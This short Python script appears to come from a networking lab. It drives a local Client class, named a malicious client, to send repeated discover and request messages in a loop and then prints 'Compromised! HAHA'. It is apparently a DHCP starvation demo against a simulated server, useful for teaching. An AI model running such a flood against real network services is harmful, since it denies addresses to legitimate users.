import sys
import os.path
sys.path.append(
    os.path.abspath(os.path.join(os.path.dirname(__file__), os.path.pardir)))

from client import Client
import time

malcious_client = Client()

for _ in range(10):
    malcious_client.sendDiscover()
    time.sleep(2)
    malcious_client.awaitMessage()
    malcious_client.createRequest()
    malcious_client.awaitMessage()

print("Compromised! HAHA")